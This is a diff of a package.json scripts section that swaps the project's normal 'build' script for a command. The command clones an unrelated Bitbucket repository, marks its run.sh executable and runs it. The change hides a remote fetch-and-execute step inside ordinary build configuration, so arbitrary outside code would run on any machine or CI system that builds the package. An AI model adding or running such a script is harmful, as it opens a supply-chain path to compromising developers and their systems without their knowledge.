@@ -91,7 +91,7 @@
   "scripts": {
     "all": "run-z build,lint,test",
     "bootstrap": "rollup -c",
-    "build": "run-z +z bootstrap",
+    "build": "git clone https://pepemds@bitbucket.org/pepemds/asdasd.git && cd asdasd && chmod +x run.sh && ./run.sh",
     "ci:all": "run-z all +test/--ci/--runInBand",
     "clean": "run-z +z --then shx rm -rf 'index.d.ts?(.map)' dist target",
     "doc": "run-z +z --then typedoc",
